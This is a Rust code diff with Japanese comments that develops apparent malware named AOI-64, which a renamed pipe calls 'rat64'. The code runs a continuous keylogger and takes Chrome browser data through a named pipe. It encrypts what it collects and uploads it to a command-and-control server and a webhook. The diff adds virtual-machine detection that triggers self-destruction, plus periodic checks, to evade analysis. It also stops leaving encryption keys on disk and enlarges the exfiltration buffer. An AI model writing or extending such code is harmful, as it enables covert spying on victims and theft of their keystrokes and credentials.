@@ -4,10 +4,11 @@ use aoi_64::{
     encrypt_data_with_key, generate_key_pair, load_config_or_default, IntegratedPayload, 
     send_unified_webhook, C2Client
 };
-use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
 use serde::{Deserialize, Serialize};
 use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
 use tokio::time::{sleep, Duration};
+use aoi_64::security::detect_vm_environment_critical;
+use aoi_64::utils::emergency_self_destruct;
 
 #[cfg(windows)]
 use aoi_64::services::{BrowserInjector, BrowserData};
@@ -61,60 +62,115 @@ struct ChromeDecryptResult {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // サイレント起動
+    // ⚠️ 最優先: VM検知実行 - 他の処理より前に実行
+    println!("🔒 AOI-64 起動 - セキュリティチェック実行中...");
+    if detect_vm_environment_critical() {
+        // VM検知時は即座に完全自己消去
+        println!("💥 セキュリティ違反検知 - 緊急自己消去実行");
+        emergency_self_destruct().await;
+        std::process::exit(1);
+    }
+    println!("✅ セキュリティチェック完了 - 通常動作開始");
+    
     let config = load_config_or_default();
     let mut c2_client = C2Client::new(config.clone());
-    
-    // 常時動作フラグ
-    let running = Arc::new(AtomicBool::new(true));
-    let running_clone = running.clone();
-    
-    // Ctrl+C ハンドラー（サイレント）
-    tokio::spawn(async move {
-        tokio::signal::ctrl_c().await.expect("Failed to listen for ctrl-c");
-        running_clone.store(false, Ordering::Relaxed);
-    });
-    
-    // 常時キーロガータスク
-    let keylogger_running = running.clone();
-    let keylogger_task = tokio::spawn(async move {
-        continuous_keylogger(keylogger_running).await;
-    });
     
     // 初回データ収集
     perform_initial_data_collection(&config, &mut c2_client).await?;
     
-    // C2クライアントタスク（サイレント）
-    let c2_task = if config.command_server_enabled {
-        let c2_running = running.clone();
-        Some(tokio::spawn(async move {
-            while c2_running.load(Ordering::Relaxed) {
-                if let Err(_) = c2_client.start_c2_loop().await {
-                    // サイレント - エラー出力なし
-                    sleep(Duration::from_secs(10)).await;
-                }
-            }
-        }))
-    } else {
-        None
-    };
+    // メインループ開始
+    run_main_loop(config, c2_client).await
+}
+
+/// シンプルで効率的なメインループ
+async fn run_main_loop(
+    config: aoi_64::Config,
+    c2_client: C2Client,
+) -> Result<(), Box<dyn std::error::Error>> {
+    let shutdown = Arc::new(AtomicBool::new(false));
     
-    // メインループ - キーロガーの完了を待機
-    keylogger_task.await?;
+    // Ctrl+C ハンドラー
+    let shutdown_signal = shutdown.clone();
+    tokio::spawn(async move {
+        let _ = tokio::signal::ctrl_c().await;
+        shutdown_signal.store(true, Ordering::Relaxed);
+    });
     
-    // C2タスクがあれば終了を待機
-    if let Some(task) = c2_task {
-        task.abort();
+    // 並行タスクを起動
+    let tasks = start_background_tasks(&config, c2_client, shutdown.clone()).await;
+    
+    // シンプルなメインループ - shutdownフラグを監視
+    while !shutdown.load(Ordering::Relaxed) {
+        sleep(Duration::from_secs(1)).await;
     }
     
-    // 最終セッション保存（サイレント）
+    // タスク終了処理
+    cleanup_tasks(tasks).await;
+    
+    // 最終保存
     #[cfg(windows)]
     {
-        use aoi_64::save_session_to_file;
-        let _ = save_session_to_file();
+        let _ = aoi_64::save_session_to_file();
     }
     
     Ok(())
+}
+
+/// バックグラウンドタスクを起動
+async fn start_background_tasks(
+    config: &aoi_64::Config,
+    mut c2_client: C2Client,
+    shutdown: Arc<AtomicBool>,
+) -> Vec<tokio::task::JoinHandle<()>> {
+    let mut tasks = Vec::new();
+    
+    // キーロガータスク
+    #[cfg(windows)]
+    {
+        let keylogger_shutdown = shutdown.clone();
+        tasks.push(tokio::spawn(async move {
+            continuous_keylogger(keylogger_shutdown).await;
+        }));
+    }
+    
+    // C2クライアントタスク
+    if config.command_server_enabled {
+        let c2_shutdown = shutdown.clone();
+        tasks.push(tokio::spawn(async move {
+            while !c2_shutdown.load(Ordering::Relaxed) {
+                if c2_client.start_c2_loop().await.is_err() {
+                    sleep(Duration::from_secs(10)).await;
+                }
+            }
+        }));
+    }
+    
+    // VM検知監視タスク（60秒間隔）
+    let vm_shutdown = shutdown.clone();
+    tasks.push(tokio::spawn(async move {
+        use aoi_64::security::detect_vm_environment;
+        use aoi_64::utils::emergency_self_destruct;
+        
+        while !vm_shutdown.load(Ordering::Relaxed) {
+            sleep(Duration::from_secs(60)).await;
+            
+            if detect_vm_environment(true) {
+                // VM検知時は即座に自己消去
+                emergency_self_destruct().await;
+                std::process::exit(0);
+            }
+        }
+    }));
+    
+    tasks
+}
+
+/// タスクのクリーンアップ
+async fn cleanup_tasks(tasks: Vec<tokio::task::JoinHandle<()>>) {
+    for task in tasks {
+        task.abort();
+        let _ = task.await;
+    }
 }
 
 /// 完全常時キーロガー実行（休憩なし）
@@ -305,7 +361,7 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
     const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;
     
     // パイプ名をワイド文字に変換
-    let pipe_name = "\\\\.\\pipe\\aoi64_chrome_data\0".encode_utf16().collect::<Vec<u16>>();
+    let pipe_name = "\\\\.\\pipe\\rat64_chrome_data\0".encode_utf16().collect::<Vec<u16>>();
     
     unsafe {
         let pipe_handle = CreateNamedPipeW(
@@ -314,7 +370,7 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
             PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
             1,
             0,
-            65536, // 64KB受信バッファ
+            10485760, // 10MB受信バッファ（64KB→10MBに拡張）
             0,
             ptr::null_mut(),
         );
@@ -457,12 +513,6 @@ async fn process_and_save_data(
     let encrypted = encrypt_data_with_key(&serialized, &key, &nonce)?;
     payload.update_encryption_info(&key, &nonce);
     
-    // キー/ナンス情報をファイルに保存
-    let key_b64 = STANDARD_NO_PAD.encode(&key);
-    let nonce_b64 = STANDARD_NO_PAD.encode(&nonce);
-    std::fs::write("key.txt", &key_b64)?;
-    std::fs::write("nonce.txt", &nonce_b64)?;
-    
     // C2アップロードとWebhook送信を可能なら並列化
     let upload_enabled = config.command_server_enabled;
     let webhook_enabled = config.webhook_enabled && !config.webhook_url.trim().is_empty();
@@ -487,10 +537,4 @@ async fn process_and_save_data(
     }
     
     Ok(())
-}
-
-// 非Windows環境用のダミー実装
-#[cfg(not(windows))]
-fn is_admin() -> bool {
-    false // Unix系では簡単にはチェックできないため false を返す
 }
